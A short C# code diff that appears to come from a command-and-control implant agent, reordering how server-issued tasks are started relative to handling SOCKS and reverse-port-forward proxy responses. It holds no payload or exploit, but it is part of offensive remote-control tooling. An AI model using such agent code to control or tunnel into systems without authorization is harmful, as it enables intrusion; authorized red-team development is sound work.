@@ -125,14 +125,6 @@ namespace Agent
                 return;
             }
 
-            if(args.tasking_response.tasks is not null)
-            {
-                Parallel.ForEach(args.tasking_response.tasks, async task =>
-                {
-                    this.taskManager.StartTaskAsync(new ServerJob(task));
-                });
-            }
-
             if (args.tasking_response.socks is not null)
             {
                 this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks);
@@ -141,6 +133,14 @@ namespace Agent
             if (args.tasking_response.rpfwd is not null)
             {
                 this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd);
+            }
+
+            if (args.tasking_response.tasks is not null)
+            {
+                Parallel.ForEach(args.tasking_response.tasks, async task =>
+                {
+                    this.taskManager.StartTaskAsync(new ServerJob(task));
+                });
             }
 
             if (args.tasking_response.delegates is not null)
